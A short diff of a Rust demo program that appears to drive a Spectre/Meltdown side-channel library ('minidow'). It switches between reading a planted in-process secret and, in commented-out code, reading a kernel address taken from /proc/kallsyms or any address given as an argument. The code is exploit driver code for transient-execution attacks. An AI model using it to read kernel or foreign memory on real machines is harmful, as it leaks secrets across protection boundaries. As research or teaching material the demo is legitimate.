@@ -3,7 +3,6 @@ use minidow::*;
 fn main() {
     setup_measurements();
 
-    /*
     let (tx, rx) = std::sync::mpsc::channel();
 
     std::thread::spawn(move || {
@@ -14,6 +13,19 @@ fn main() {
 
     let secret_addr = rx.recv().unwrap();
 
+    /*
+    println!(
+        "With Meltdown: 0x{:x}",
+        read_ptr::<Meltdown>(
+            || {
+                std::fs::read_to_string("/proc/version").unwrap();
+            },
+            // address of linux_proc_banner, listed in /proc/kallsyms
+            0xffffffffb0200160
+        )
+    );
+    */
+
     println!(
         "With Spectre: 0x{:x}",
         read_ptr::<Spectre>(|| {}, secret_addr)
@@ -23,9 +35,10 @@ fn main() {
         "With Meltdown: 0x{:x}",
         read_ptr::<Meltdown>(|| {}, secret_addr)
     );
-    */
 
+    /*
     let arg = std::env::args().skip(1).take(1).next().unwrap();
     let addr = usize::from_str_radix(&arg[2..], 16).unwrap();
     println!("With Spectre: 0x{:x}", read_ptr::<Spectre>(|| {}, addr));
+    */
 }
